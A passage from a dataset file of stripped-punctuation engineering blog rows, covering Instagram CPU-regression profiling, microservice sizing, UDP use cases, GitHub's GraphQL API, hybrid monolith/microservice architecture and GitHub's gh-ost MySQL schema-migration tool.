wouldn t have been committed in the first place     That s why we needed a Python profiler that the developer can use to find the root cause of the regression  once Dynostats identifies it   Instead of starting from scratch  we decided to make slight alterations to cProfile  a readily available Python profiler  The cProfile module normally provides a set of statistics describing how long and how often various parts of a program were executed  Instead of measuring in time  we took cProfile and replaced the timer with a CPU instruction counter that reads from hardware counters  The data is created at the end of the sampled requests and sent to some data pipelines  We also send metadata similar to what we have in Dynostats  such as server name  cluster  region  endpoint name  etc   On the other side of the data pipeline  we created a tailer to consume the data  The main functionality of the tailer is to parse the cProfile stats data and create entities that represent Python function level CPU instructions  By doing so  we can aggregate CPU instructions by Python functions  making it easier to tell which functions contribute to CPU regression   Monitoring and Alerting Mechanism  At Instagram  we deploy our backend 30 50 times a day  Any one of these deployments can contain troublesome CPU regressions  Since each rollout usually includes at least one diff  it is easy to identify the cause of any regression  Our efficiency monitoring mechanism includes scanning the CPU instruction in Dynostats before and after each rollout  and sending out alerts when the change exceeds a certain threshold  For the CPU regressions happening over longer periods of time  we also have a detector to scan daily and weekly changes for the most heavily loaded endpoints     Deploying new changes is not the only thing that can trigger a CPU regression  In many cases  the new features or new code paths are controlled by global environment variables  GEV   There are very common practices for rolling out new features to a subset of users on a planned schedule  We added this information as extra metadata fields for each request in Dynostats and cProfile stats data  Grouping requests by those fields reveal possible CPU regressions caused by turning the GEVs  This enables us to catch CPU regressions before they can impact performance   What s Next   Dynostats and our customized cProfile  along with the monitoring and alerting mechanism we ve built to support them  can effectively identify the culprit for most CPU regressions  These developments have helped us recover more than 50  of unnecessary CPU regressions  which would have otherwise gone unnoticed     There are still areas where we can improve and make it easier to embed into Instagram s daily deployment flow   The CPU instruction metric is supposed to be more stable than other metrics like CPU time  but we still observe variances that make our alerting noisy  Keeping signal noise ratio reasonably low is important so that developers can focus on the real regressions  This could be improved by introducing the concept of confidence intervals and only alarm when it is high  For different endpoints  the threshold of variation could also be set differently  One limitation for detecting CPU regressions by GEV change is that we have to manually enable the logging of those comparisons in Dynostats  As the number of GEVs increases and more features are developed  this wont scale well  Instead  we could leverage an automatic framework that schedules the logging of these comparisons and iterates through all GEVs  and send alerts when regressions are detected  cProfile needs some enhancement to handle wrapper functions and their children functions better   With the work we ve put into building the efficiency framework for Instagram s web service  we are confident that we will keep scaling our service infrastructure using Python  We ve also started to invest more into the Python language itself  and are beginning to explore moving our Python from version 2 to 3  We will continue to explore this and more experiments to keep improving both infrastructure and developer efficiency  and look forward to sharing more soon   Min Ni is a software engineer at Instagram,"[1117 1403 1351 733 673 251 669 915 1336 1422 778]"
1126,training-dataset/engineering/320.txt,engineering,The size of a microservice is the size of the team that is building it JAXenter  Have microservices helped you achieve your goals   Aviran Mordo  Definitely  by using microservices we created many small teams where each is responsible for different parts of our system without stepping on each other s toes  We have also defined two main SLAs where microservices architecture really comes into play and we can easily create microservices for different system SLA   JAXenter  What do you think should be the optimal size of a microservice   Aviran Mordo  There is no such thing an optimal size of a microservice in my opinion  The size of a microservice is the size of the team that is building it  Engineers should be pragmatic about their choices  Sometimes it makes sense to have a large microservice that is almost a monolith  and sometimes it can be as tiny as one function  Just like everything we do in a large system  it is all about the tradeoffs and what is more important to your use case   JAXenter  What is the biggest challenge of microservices   Aviran Mordo  The biggest challenge is the fact that you are now operating in a distributed system where you really need to understand and handle distributed transactions  cascading failures  deployment dependencies and compatibility issues  Microservices also go hand in hand with the DevOps culture and continuous delivery  Operating a large scale microservices architecture is almost impossible without the right culture and mindset as your Ops team will not be able to handle hundreds of microservices in production   The most important tooling for microservices is CI   JAXenter  What technology do you think is the most important as far as microservices are concerned   Aviran Mordo  Microservices can be done with any technology stack  I think there are tools and technologies that make things simpler such as containers  Spring Boot and more but it can be done very well without any of them  I think the most important tooling for microservices is CI and good deployment tools together with good monitoring tools   JAXenter  How much do microservices influence an organization  Can they leave the organization unchanged   Aviran Mordo  Microservices change the organization structure as they enable the creation of small teams that can progress very fast and independent from each other  Microservices represent the first post DevOps architecture  old style organizations that do not practice DevOps will probably not be able to operate large scale microservices in system   JAXenter  When should you not use microservices   Aviran Mordo  Like everything  microservices come to solve a problem  If your organization does not have a problem with a monolith and can progress fast enough without any scalability concerns  you should stick to the monolith  it is much easier to operate and understand   SEE ALSO  Why should you do microservices  or maybe you shouldn t,"[1126 773 60 548 1377 234 278 1159 1405 695 87]"
1128,training-dataset/engineering/743.txt,engineering,What s interesting about UDP I asked on Twitter today  what s interesting about UDP    this tweet  I got a bajillion replies  Here s a rough summary because there was some really interesting stuff in there once I made it through all the UDP jokes and I don t want to lose it   First  we should talk about what UDP is for a second  UDP lets you send network packets  If a UDP packet you send gets dropped  you never find out about it and nobody will help you retry  Retrying is up to you   Technically speaking it stands for  user datagram protocol  but I think  unreliable data protocol  is better because it s funny and probably more accurate anyway   Another fact about UDP is that if you mention UDP there will be 1000 jokes about dropping packets   So  What is there to know about UDP  Here s a list   One interesting thing was that there s a really common notion  video streaming VOIP uses UDP  and  games use UDP  but I think the issues there are actually kind of subtle and sometimes these things actually end up using TCP instead  I don t understand this very well yet but it doesn t seem to be totally straightforward   DNS uses UDP  This is possibly the most important protocol that works on top of UDP  I think the reason DNS uses UDP is probably that practically all DNS requests and responses fit into a single IP packet  so retry logic is relatively simple  you send your request  if you don t get a response  you just   try again   You don t need to assemble multiple packets   When servers need to send a large DNS response  they use TCP instead  I actually ran into a bug at work recently related to this   in one case UDP DNS responses were working properly  and TCP responses weren t    statsd uses UDP  statsd is a metrics server from Etsy  The idea here is that statsd uses UDP because metrics reporting should be as cheap as possible  sending UDP packets is really fast  there is no connection to manage   Some extra factors   the overhead of setting up a TCP connection is pretty high  so they don t want to do that for every single statistics request  Etsy uses PHP  which I think means they can t have long lived persistent TCP connections  Also apparently sometimes people do logging  like syslog  over UDP  Here s an RFC about that  It s not clear to me that this is generally a good idea  it leads with  Network administrators and architects should be aware of the significant reliability and security issues of this transport    Packet size limits  The practical packet size limits for UDP are pretty important to understand   This seems super important   with TCP you can kind of ignore the fact that internet packets can only be so big  because TCP will automatically combine packets for you  With UDP  it gets important really fast because there s no automatic combining of packets  You need to manually split up your data into packets   For example the reason there are only 13 root DNS servers is that DNS uses UDP and that is how many fit inside a single UDP packet   according to wikipedia   WebRTC uses UDP  The chapter in  High Performance Browser Networking  about WebRTC is super interesting and well written and very much worth a read  Also that whole book is great  Actually you should probably just go read that chapter instead of this blog post      Some games use UDP  Your Game Doesn t Need UDP  Yet  is an article about this  Many real time games use UDP because dropped frames are considered better than delayed frames  I know almost nothing about this    caitie summarized the reason some games use UDP pretty clearly   UDP is used for video and some games because with TCP you can get huge delays for one dropped packet  Imagine you are sending 20 packets via TCP  and packet 3 goes missing  Due to network delay you don t get the missing packet 3 msg until you ve sent all 20 messages so now you have to send 3 through 20 again to guarantee in order delivery  So on very lossy networks you can waste a lot of bandwidth and cycles resending packets   video streaming uses UDP  sometimes   Most h 264 streams for live cameras and such are UDP as far as I know    here    I worked on the video delivery side more recently  and RTMP  RTSP  and obviously HLS etc  are all TCP now   here   probably don t reimplement TCP on top of UDP  If you actually want reliable message delivery  you should probably just use TCP and not try to do any fancy UDP tricks  If you really actually do not care if your packets arrive or not and they are all basically independent of each other and the order does not matter at all  like with statsd   maybe that is a good time to use UDP   It s possible that  most of the time  the answer to  when should I use UDP  is  don t  just use TCP instead  it ll be easier    Google is maybe trying to reimplement TCP with UDP though  See QUIC  SPDY  multicast  Wikipedia says  The most common transport layer protocol to use multicast addressing is User Datagram Protocol  UDP    I still don t understand what s up with multicast but many people mentioned it  Here s the wikipedia article    udp lets you write stateless protocols  stateless protocols are great cause you can talk to millions of peers from 1 machine   other interesting stuff  udp checksum is endian independent    how Bittorrent built uTP on top of it is interesting   I ve been confused before that you can still get a  connection refused   via icmp  even though UDP is connectionless  this is a real  weird  thing   UDP is used in a bunch of denial of service attacks in various ways   you can write someone else s address as the return address  A lot  This sucks     UDP came about when tcp was split into ip and tcp   It s really hard to do load balancing well for UDP  but that can be really important  eg for server infrastructure for video calls     DHCP uses UDP  strictly speaking UDP carries  more data  than TCP because TCP headers take more space  more overhead  than UDP headers  I think there are some issues with UDP and network address translation  NAT  because UDP doesn t have connections  I m not super clear on this though   It s easier to spoof IPs for UDP traffic since no handshake is necessary  Questions,"[1128 36 1336 778 1351 251 1373 92 1295 1347 794]"
1138,training-dataset/engineering/383.txt,engineering,JS Monthly LondonPublished on Aug 23  2016  MVC is a well established design pattern that is currently being challenged by the Facebook Flux architecture  In this talk  Guy Nesher covers the core differences  the reason for the change  and looks at one implementation of Flux using the Redux library       Event      This talk was part of JS Monthly London in July  http   www meetup com js monthly lond           Transcript      https   blog pusher com from mvc to f         Video by Pusher      Pusher is a hosted service with APIs  developer tools and open source libraries that greatly simplify integrating real time functionality into web and mobile applications     Pusher will automatically scale when required  removing all the pain of setting up and maintaining a secure  real time infrastructure     Pusher is already trusted to do so by thousands of developers and companies like GitHub  MailChimp  the Financial Times  Buffer and many more     Getting started takes just a few seconds  simply go to https   pusher com and create a free account  Happy hacking       More from Pusher      Subscribe to Pusher  https   www youtube com c pusherrealt     JS Monthly London playlist  https   www youtube com playlist list,"[1138 134 112 60 1216 1300 988 582 1095 150 695]"
1148,training-dataset/engineering/1140.txt,engineering,The GitHub GraphQL APIGitHub announced a public API one month after the site launched  We ve evolved this platform through three versions  adhering to RFC standards and embracing new design patterns to provide a clear and consistent interface  We ve often heard that our REST API was an inspiration for other companies  countless tutorials refer to our endpoints  Today  we re excited to announce our biggest change to the API since we snubbed XML in favor of JSON  we re making the GitHub API available through GraphQL   GraphQL is  at its core  a specification for a data querying language  We d like to talk a bit about GraphQL  including the problems we believe it solves and the opportunities it provides to integrators   Why   You may be wondering why we chose to start supporting GraphQL  Our API was designed to be RESTful and hypermedia driven  We re fortunate to have dozens of different open source clients written in a plethora of languages  Businesses grew around these endpoints   Like most technology  REST is not perfect and has some drawbacks  Our ambition to change our API focused on solving two problems   The first was scalability  The REST API is responsible for over 60  of the requests made to our database tier  This is partly because  by its nature  hypermedia navigation requires a client to repeatedly communicate with a server so that it can get all the information it needs  Our responses were bloated and filled with all sorts of  _url hints in the JSON responses to help people continue to navigate through the API to get what they needed  Despite all the information we provided  we heard from integrators that our REST API also wasn t very flexible  It sometimes required two or three separate calls to assemble a complete view of a resource  It seemed like our responses simultaneously sent too much data and didn t include data that consumers needed   As we began to audit our endpoints in preparation for an APIv4  we encountered our second problem  We wanted to collect some meta information about our endpoints  For example  we wanted to identify the OAuth scopes required for each endpoint  We wanted to be smarter about how our resources were paginated  We wanted assurances of type safety for user supplied parameters  We wanted to generate documentation from our code  We wanted to generate clients instead of manually supplying patches to our Octokit suite  We studied a variety of API specifications built to make some of this easier  but we found that none of the standards totally matched our requirements   And then we learned about GraphQL   The switch  GraphQL is a querying language developed by Facebook over the course of several years  In essence  you construct your request by defining the resources you want  You send this via a POST to a server  and the response matches the format of your request   For example  say you wanted to fetch just a few attributes off of a user  Your GraphQL query might look like this     viewer   login bio location isBountyHunter      And the response back might look like this      data       viewer       login     octocat     bio     I ve been around the world  from London to the Bay      location     San Francisco  CA     isBountyHunter    true        You can see that the keys and values in the JSON response match right up with the terms in the query string   What if you wanted something more complicated  Let s say you wanted to know how many repositories you ve starred  You also want to get the names of your first three repositories  as well as their total number of stars  total number of forks  total number of watchers  and total number of open issues  That query might look like this     viewer   login starredRepositories   totalCount   repositories first  3    edges   node   name stargazers   totalCount   forks   totalCount   watchers   totalCount   issues states  OPEN     totalCount              The response from our API might be      data      viewer      login     octocat     starredRepositories       totalCount    131     repositories      edges        node      name     octokit rb     stargazers      totalCount    17     forks      totalCount    3     watchers      totalCount    3     issues       totalCount    1           node      name     octokit objc     stargazers      totalCount    2     forks      totalCount    0     watchers      totalCount    1     issues       totalCount    10           node      name     octokit net     stargazers      totalCount    19     forks      totalCount    7     watchers      totalCount    3     issues       totalCount    4                  You just made one request to fetch all the data you wanted   This type of design enables clients where smaller payload sizes are essential  For example  a mobile app could simplify its requests by only asking for the data it needs  This enables new possibilities and workflows that are freed from the limitations of downloading and parsing massive JSON blobs   Query analysis is something that we re also exploring with  Based on the resources that are requested  we can start providing more intelligent information to clients  For example  say you ve made the following request     viewer   login email      Before executing the request  the GraphQL server notes that you re trying to get the email field  If your client is misconfigured  a response back from our server might look like this      data       viewer       login     octocat        errors         message     Your token has not been granted the required scopes to execute this query  The  email  field requires one of the following scopes    user    but your token has only been granted the    gist   scopes  Please modify your token s scopes at  https   github com settings tokens          This could be beneficial for users concerned about the OAuth scopes required by integrators  Insight into the scopes required could ensure that only the appropriate types are being requested   There are several other features of GraphQL that we hope to make available to clients  such as   The ability to batch requests  where you can define dependencies between two separate queries and fetch data efficiently   The ability to create subscriptions  where your client can receive new data when it becomes available   The ability to defer data  where you choose to mark a part of your response as time insensitive   Defining the schema  In order to determine if GraphQL really was a technology we wanted to embrace  we formed a small team within the broader Platform organization and went looking for a feature on the site we wanted to build using GraphQL  We decided that implementing emoji reactions on comments was concise enough to try and port to GraphQL  Choosing a subset of the site to power with GraphQL required us to model a complete workflow and focus on building the new objects and types that defined our GraphQL schema  For example  we started by constructing a user in our schema  moved on to a repository  and then expanded to issues within a repository  Over time  we grew the schema to encapsulate all the actions necessary for modeling reactions   We found implementing a GraphQL server to be very straightforward  The Spec is clearly written and succinctly describes the behaviors of various parts of a schema  GraphQL has a type system that forces the server to be unambiguous about requests it receives and responses it produces  You define a schema  describing the objects that represent your resources  fields on those objects  and the connections between various objects  For example  a Repository object has a non null String field for the name   A repository also has watchers   which is a connection to another non nullable object  User    Although the initial team exploring GraphQL worked mostly on the backend  we had several allies on the frontend who were also interested in GraphQL  and  specifically  moving parts of GitHub to use Relay  They too were seeking better ways to access user data and present it more efficiently on the website  We began to work together to continue finding portions of the site that would be easy to communicate with via our nascent GraphQL schema  We decided to begin transforming some of our social features  such as the profile page  the stars counter  and the ability to watch repositories  These initial explorations paved the way to placing GraphQL in production   That s right  We ve been running GraphQL in production for some time now   As time went on  we began to get a bit more ambitious  we ported over some of the Git commit history pages to GraphQL and used Scientist to identify any potential discrepancies   Drawing off our experiences in supporting the REST API  we worked quickly to implement our existing services to work with GraphQL  This included setting up logging requests and reporting exceptions  OAuth and AuthZ access  rate limiting  and providing helpful error responses  We tested our schema to ensure that every part of was documented and we wrote linters to ensure that our naming structure was standardized   Open source  We work primarily in Ruby  and we were grateful for the existing gems supporting GraphQL  We used the rmosolgo graphql ruby gem to implement the entirety of our schema  We also incorporated the Shopify graphql batch gem to ensure that multiple records and relationships were fetched efficiently   Our frontend and backend engineers were also able to contribute to these gems as we experimented with them  We re thankful to the maintainers for their very quick work in accepting our patches  To that end  we d like to humbly offer a couple of our own open source projects   github graphql client  a client that can be integrated into Rails for rendering GraphQL backed views   github github graphql rails example  a small app built with Rails that demonstrates how you might interact with our GraphQL schema   We re going to continue to extract more parts of our system that we ve developed internally and release them as open source software  such as our loaders that efficiently batch ActiveRecord requests   The future  The move to GraphQL marks a larger shift in our Platform strategy to be more transparent and more flexible  Over the next year  we re going to keep iterating on our schema to bring it out of Early Access and into a wider production readiness   Since our application engineers are using the same GraphQL platform that we re making available to our integrators  this provides us with the opportunity to ship UI features in conjunction with API access  Our new Projects feature is a good example of this  the UI on the site is powered by GraphQL  and you can already use the feature programmatically  Using GraphQL on the frontend and backend eliminates the gap between what we release and what you can consume  We really look forward to making more of these simultaneous releases   GraphQL represents a massive leap forward for API development  Type safety  introspection  generated documentation  and predictable responses benefit both the maintainers and consumers of our platform  We re looking forward to our new era of a GraphQL backed platform  and we hope that you do  too   If you d like to get started with GraphQL including our new GraphQL Explorer that lets you make live queries   check out our developer documentation,"[1148 1351 257 673 54 61 520 778 214 1347 613]"
1159,training-dataset/engineering/872.txt,engineering,When to Consider a Hybrid Architectural ApproachOne of the primary questions in application development today is whether to build applications using a monolithic or a microservices architectural approach  This is not a brand new issue  and there are arguments on both sides that make sense   In a recent interview with The New Builders podcast  CTO Dave Riess shared how Wunder Capital worked through the process adopting an architectural approach that uses elements of both monoliths and microservices   Listen to Ep  8    The microservice approach looks pretty appealing when you re coming out of a monolithic environment   he said   There are some things that  a microservice approach  does really  really well  and it s easy to become pretty quickly enamored with some of the benefits it presents    In Riess s opinion  microservices do solve a lot of fundamental flaws in a monolithic application   like how monoliths grow unwieldy as they age  for example  In the age of cloud  dev ops and agile development  it seems like the move to microservices would be a no brainer  and for some it is  as long as they re able to fit together a collection of moving parts  and do so in a way that makes changes  management  security and maintenance easy   But that doesn t mean the process of building using microservices is always straightforward    When you start to dig into it   Riess said   running multiple services for specific functional areas of the application becomes quite challenging  You have to embrace things like  remote procedure calls   While that might not seem like a particularly heavy lift effort at first glance  it does require that developers start considering things like network latency and network stability  It s not just method calls within a single process    If your team is talented  good at setting boundaries between processes and modules  and able to work with various communication protocols  then a microservices approach might be the way to go  says  Building Microservices  author Sam Newman   Sometimes that means starting with a monolith and then peeling off services as they become clear  Sometimes that means starting with a distributed microservices architecture   No RPC  No Asynchrony  No Work Across 10 Code Bases  According to developer and blogger Martin Fowler  a hybrid approach  between a monolith and microservices  may be best  but it comes down to a number of factors   First off  don t consider using microservices unless the project is large and complex  says Fowler  If the project is fairly straightforward and can be developed easily using one programming language  then a monolithic approach is just fine   This is because microservices  while extremely flexible and modular  come with a management penalty  This means that applications developed using microservices are highly dependent on the skill of your development team  and the extent to which they can troubleshoot  update and modify the app   Development teams should also consider speed when evaluating a microservices approach  When developing a new application  it will inevitably go through many rounds of trial and error to get right  Taking a monolithic first approach allows you to stand up a prototype and iterate much faster  This is where a hybrid approach can pay dividends  The idea is to start the project as a monolith and  by paying attention to modularity within the software  both at the API boundaries and how the data is stored   you can easily shift to a microservices architecture later on  Fowler says   Riess and Wunder Capital opted for a hybrid approach by building services within their monolith  but not having them run on different servers  According to Riess   That allows us to make service calls that are effectively method calls  We don t have to worry about RPC  We don t have to worry about the asynchrony you do in a service oriented world  We also don t have to worry about working across 10 different code bases    The hybrid approach allowed Wunder Capital to compartmentalize the complexity in their namespace servers and set them up for future success    Down the road when we achieve a level of scale that justifies breaking out an individual service in a standalone faction  that will be relatively easy to do   Riess said   To learn more about what factors Wunder Capital considered when weighing microservices vs  monolith approaches  you can listen to  The Third Way in the Monolith vs  Microservices Debate  a podcast with CTO Dave Riess   And for more stories from The New Builders podcast  find us on SoundCloud  IBM developerWorks TV at The New Builders  and on iTunes  coming soon   Please send thoughts  feedback  and guest ideas to me at jwyoung us ibm com or Doug Flora at dsflora us ibm com  or reply in the comments   Share this post   Share on FacebookShare on LinkedInShare on Twitter,"[1159 773 1377 60 548 234 278 1126 695 1405 596]"
1162,training-dataset/engineering/232.txt,engineering,gh ost  GitHub s online schema migration tool for MySQLToday we are announcing the open source release of gh ost  GitHub s triggerless online schema migration tool for MySQL   gh ost has been developed at GitHub in recent months to answer a problem we faced with ongoing  continuous production changes requiring modifications to MySQL tables  gh ost changes the existing online table migration paradigm by providing a low impact  controllable  auditable  operations friendly solution   MySQL table migration is a well known problem  and has been addressed by online schema change tools since 2009  Growing  fast paced products often require changes to database structure  Adding changing removing columns and indexes etc   are blocking operations with the default MySQL behavior  We conduct such schema changes multiple times per day and wish to minimize user facing impact   Before illustrating gh ost   let s address the existing solutions and the reasoning for embarking on a new tool   Online schema migrations  existing landscape  Today  online schema changes are made possible via these three main options   Migrate the schema on a replica  clone apply on other replicas  promote refactored replica as new master  Use MySQL s Online DDL for InnoDB  Use a schema migration tool  Most common today are pt online schema change and Facebook s OSC  also found are LHM and the original oak online alter table tool   Other options include Rolling Schema Upgrade with Galera Cluster  and otherwise non InnoDB storage engines  At GitHub we use the common master replicas architecture and utilize the reliable InnoDB engine   Why have we decided to embark on a new solution rather than use either of the above  The existing solutions are all limited in their own ways  and the below is a very brief and generalized breakdown of some of their shortcomings  We will drill down more in depth about the shortcomings of the trigger based online schema change tools   Replica migration makes for an operational overhead  which requires larger host count  longer delivery times and more complex management  Changes are applied explicitly on specific replicas or on sub trees of the topology  Such considerations as hosts going down  host restores from an earlier backup  newly provisioned hosts  all require a strict tracking system for per host changes  A change might require multiple iterations  hence more time  Promoting a replica to master incurs a brief outage  Multiple changes going at once are more difficult to coordinate  We commonly deploy multiple schema changes per day and wish to be free of the management overhead  while we recognize this solution to be in use   MySQL s Online DDL for InnoDB is only  online  on the server on which it is invoked  Replication stream serializes the alter which causes replication lag  An attempt to run it individually per replica results in much of the management overhead mentioned above  The DDL is uninterruptible  killing it halfway results in long rollback or with data dictionary corruption  It does not play  nice   it cannot throttle or pause on high load  It is a commitment into an operation that may exhaust your resources   We ve been using pt online schema change for years  However as we grew in volume and traffic  we hit more and more problems  to the point of considering many migrations as  risky operations   Some migrations would only be able to run during off peak hours or through weekends  others would consistently cause MySQL outage  All existing online schema change tools utilize MySQL triggers to perform the migration  and therein lies a few problems   What s wrong with trigger based migrations   All online schema change tools operate in similar manner  they create a ghost table  in the likeness of your original table  migrate that table while empty  slowly and incrementally copy data from your original table to the ghost table  meanwhile propagating ongoing changes  any INSERT   DELETE   UPDATE applied to your table  to the ghost table  When the tool is satisfied the tables are in sync  it replaces your original table with the ghost table   Tools like pt online schema change   LHM and oak online alter table use a synchronous approach  where each change to your table translates immediately  utilizing same transaction space  to a mirrored change on the ghost table  The Facebook tool uses an asynchronous approach of writing changes to a changelog table  then iterating that and applying changes onto the ghost table  All of these tools use triggers to identify those ongoing changes to your table   Triggers are stored routines which are invoked on a per row operation upon INSERT   DELETE   UPDATE on a table  A trigger may contain a set of queries  and these queries run in the same transaction space as the query that manipulates the table  This makes for an atomicy of both the original operation on the table and the trigger invoked operations   Trigger usage in general  and trigger based migrations in particular  suffer from the following   Triggers  being stored routines  are interpreted code  MySQL does not precompile them  Hooking onto your query s transaction space  they add the overhead of a parser and interpreter to each query acting on your migrated table   Locks  the triggers share the same transaction space as the original queries  and while those queries compete for locks on the table  the triggers independently compete on locks on another table  This is in particular acute with the synchronous approach  Lock contention is directly related to write concurrency on the master  We have experienced near or complete lock downs in production  to the effect of rendering the table or the entire database inaccessible due to lock contention  Another aspect of trigger locks is the metadata locks they require when created or destroyed  We ve seen stalls to the extent of many seconds to a minute while attempting to remove triggers from a busy table at the end of a migration operation   Non pausability  when load on the master turns high  you wish to throttle or suspend your pending migration  However a trigger based solution cannot truly do so  While it may suspend the row copy operation  it cannot suspend the triggers  Removal of the triggers results in data loss  Thus  the triggers must keep working throughout the migration  On busy servers  we have seen that even as the online operation throttles  the master is brought down by the load of the triggers   Concurrent migrations  we or others may be interested in being able to run multiple concurrent migrations  on different tables   Given the above trigger overhead  we are not prepared to run multiple concurrent trigger based migrations  We are unaware of anyone doing so in practice   Testing  we might want to experiment with a migration  or evaluate its load  Trigger based migrations can only simulate a migration on replicas via Statement Based Replication  and are far from representing a true master migration given that the workload on a replica is single threaded  that is always the case on a per table basis  regardless of multi threaded replication technology in use    gh ost  gh ost stands for GitHub s Online Schema Transmogrifier Transfigurator Transformer Thingy  gh ost is   Triggerless  Lightweight  Pauseable  Dynamically controllable  Auditable  Testable  Trustable  Triggerless  gh ost does not use triggers  It intercepts changes to table data by tailing the binary logs  It therefore works in an asynchronous approach  applying the changes to the ghost table some time after they ve been committed   gh ost expects binary logs in RBR  Row Based Replication  format  however that does not mean you cannot use it to migrate a master running with SBR  Statement Based Replication   In fact  we do just that  gh ost is happy to read binary logs from a replica that translates SBR to RBR  and it is happy to reconfigure the replica to do that   Lightweight  By not using triggers  gh ost decouples the migration workload from the general master workload  It does not regard the concurrency and contention of queries running on the migrated table  Changes applied by such queries are streamlined and serialized in the binary log  where gh ost picks them up to apply on the gh ost table  In fact  gh ost also serializes the row copy writes along with the binary log event writes  Thus  the master only observes a single connection that is sequentially writing to the ghost table  This is not very different from ETLs   Pauseable  Since all writes are controlled by gh ost   and since reading the binary logs is an asynchronous operation in the first place  gh ost is able to suspend all writes to the master when throttling  Throttling implies no row copy on the master and no row updates  gh ost does create an internal tracking table and keeps writing heartbeat events to that table even when throttled  in negligible volumes   gh ost takes throttling one step further and offers multiple controls over throttling   Load  a familiar feature for users of pt online schema change   one may set thresholds on MySQL metrics  such as Threads_running 30    one may set thresholds on MySQL metrics  such as Replication lag  gh ost has a built in heartbeat mechanism which it utilizes to examine replication lag  you may specify control replicas  or gh ost will implicitly use the replica you hook it to in the first place   has a built in heartbeat mechanism which it utilizes to examine replication lag  you may specify control replicas  or will implicitly use the replica you hook it to in the first place  Query  you may present with a query that decides if throttling should kick in  Consider SELECT HOUR NOW    BETWEEN 8 and 17   All the above metrics can be dynamically changed even while the migration is executing   Flag file  touch a file and gh ost begins throttling  Remove the file and it resumes work   begins throttling  Remove the file and it resumes work  User command  dynamically connect to gh ost  see following  across the network and instruct it to start throttling   Dynamically controllable  With existing tools  when a migration generates a high load  the DBA would reconfigure  say  a smaller chunk size   terminate and re run the migration from start  We find this wasteful   gh ost listens to requests via unix socket file and  configurable  via TCP  You may give gh ost instructions even while migration is running  You may  for example   echo throttle   socat    tmp gh ost sock to start throttling  Likewise you may no throttle  to start throttling  Likewise you may Change execution parameters  chunk size 1500   max lag millis 2000   max load Thread_running 30 are examples to instructions gh ost accepts that change its behavior   Auditable  Likewise  the same interface can be used to ask gh ost of the status  gh ost is happy to report current progress  major configuration params  identity of servers involved and more  As this information is accessible via network  it gives great visibility into the ongoing operation  that you would otherwise find today only by using a shared screen or tailing log files   Testable  Because the binary log content is decoupled from the master s workload  applying a migration on a replica is more similar to a true master migration  though still not completely  and more work is on the roadmap    gh ost comes with built in support for testing via   test on replica   it allows you to run a migration on a replica  such that at the end of the migration gh ost would stop the replica  swap tables  reverse the swap  and leave you with both tables in place and in sync  replication stopped  This allows you to examine and compare the two tables at your leisure   This is how we test gh ost in production at GitHub  we have multiple designated production replicas  they are not serving traffic but instead running continuous covering migration test on all tables  Each of our production tables  as small as empty and as large as many hundreds of GB  is being migrated via a trivial statement that does not really modify its structure   engine innodb    Each such migration ends with stopped replication  We take complete checksum of entire table data from both the original table and ghost table and expect them to be identical  We then resume replication and proceed to next table  Every single one of our production tables is known to have passed multiple successful migrations via gh ost   on replica   Trustable  All the above  and more  are made to build trust with gh ost  s operation  After all  it is a new tool in a landscape that has used the same tool for years   We test gh ost on replicas  we ve completed thousands of successful migrations before trying it out on masters for the first time  So can you  Migrate your replicas  verify the data is intact  We want you to do that   As you execute gh ost   and as you may suspect load on your master is increasing  go ahead and initiate throttling  Touch a file  echo throttle   See how the load on your master is just back to normal  By just knowing you can do that  you will gain a lot of peace of mind   A migration begins and the ETA says it s going to end at 2 00am   Are you concerned with the final cut over  where the tables are swapped  and you want to stick around  You can instruct gh ost to postpone the cut over using a flag file  gh ost will complete the row copy but will not flip the tables  Instead  it will keep applying ongoing changes  keeping the ghost table in sync  As you come to the office the next day  remove the flag file or echo unpostpone into gh ost   and the cut over will be made  We don t like our software to bind us into observing its behavior  It should instead liberate us to do things humans do   Speaking of ETA    exact rowcount will keep you smiling  Pay the initial price of a lengthy SELECT COUNT    on your table  gh ost will get an accurate estimate of the amount of work it needs to do  It will heuristically update that estimation as migration proceeds  While ETA timing is always subject to change  progress percentage turns accurate  If  like us  you ve been bitten by migrations stating 99  then stalling for an hour keeping you biting your fingernails  you ll appreciate the change   gh ost operation modes  gh ost operates by connecting to potentially multiple servers  as well as connecting itself as a replica in order to stream binary log events directly from one of those servers  There are various operation modes  which depend on your setup  configuration  and where you want to run the migration   a  Connect to replica  migrate on master  This is the mode gh ost expects by default  gh ost will investigate the replica  crawl up to find the topology s master  and connect to it as well  Migration will   Read and write row data on master  Read binary logs events on the replica  apply the changes onto the master  Investigate table format  columns   keys  count rows on the replica  Read internal changelog events  such as heartbeat  from the replica  Cut over  switch tables  on the master  If your master works with SBR  this is the mode to work with  The replica must be configured with binary logs enabled   log_bin   log_slave_updates   and should have binlog_format ROW   gh ost can apply the latter for you    However even with RBR we suggest this is the least master intrusive operation mode   b  Connect to master  If you don t have replicas  or do not wish to use them  you are still able to operate directly on the master  gh ost will do all operations directly on the master  You may still ask it to be considerate of replication lag   Your master must produce binary logs in RBR format   You must approve this mode via   allow on master    c  Migrate test on replica  This will perform a migration on the replica  gh ost will briefly connect to the master but will thereafter perform all operations on the replica without modifying anything on the master  Throughout the operation  gh ost will throttle such that the replica is up to date     migrate on replica indicates to gh ost that it must migrate the table directly on the replica  It will perform the cut over phase even while replication is running   indicates to that it must migrate the table directly on the replica  It will perform the cut over phase even while replication is running    test on replica indicates the migration is for purpose of testing only  Before cut over takes place  replication is stopped  Tables are swapped and then swapped back  your original table returns to its original place  Both tables are left with replication stopped  You may examine the two and compare data   gh ost at GitHub  gh ost is now powering all of our production migrations  We re running it daily  as engineering requests come  sometimes multiple times a day  With its auditing and control capabilities  we will be integrating it into our chatops  Our engineers will have clear insight into migration progress and will be able to control its behavior  Metrics and events are being collected and will provide with clear visibility into migration operations in production   Open source  gh ost is released with to the open source community under the MIT license   While we find it to be stable  we have improvements we want to make  We release it at this time as we wish to welcome community participation and contributions  From time to time we may publish suggestions for community contributions   gh ost is actively maintained  We encourage you to try it out  test it  we ve made great efforts to make it trustworthy   Acknowledgements  gh ost is designed  developed  reviewed and tested by the database infrastructure engineering team at GitHub    jonahberquist   ggunson   tomkrouper   shlomi noach  We would like to acknowledge the engineers at GitHub who have provided valuable information and advice  Thank you to our friends from the MySQL community who have reviewed and commented on this project during its pre production stages,"[1162 699 204 615 902 613 1295 310 373 1336 778]"
